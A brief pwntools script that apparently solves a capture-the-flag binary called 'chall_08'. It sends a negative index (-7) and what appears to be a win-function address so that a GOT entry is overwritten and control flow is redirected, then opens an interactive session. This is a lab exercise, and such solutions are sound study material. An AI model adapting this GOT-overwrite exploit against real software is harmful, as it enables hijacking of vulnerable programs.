from pwn import *
elf=ELF("./chall_08")
print("value",elf.sym.target-elf.sym.got['puts']//8)
p=process("./chall_08")
p.sendline("4198950")
p.sendline("-7")
print(elf.sym.win)
p.interactive()
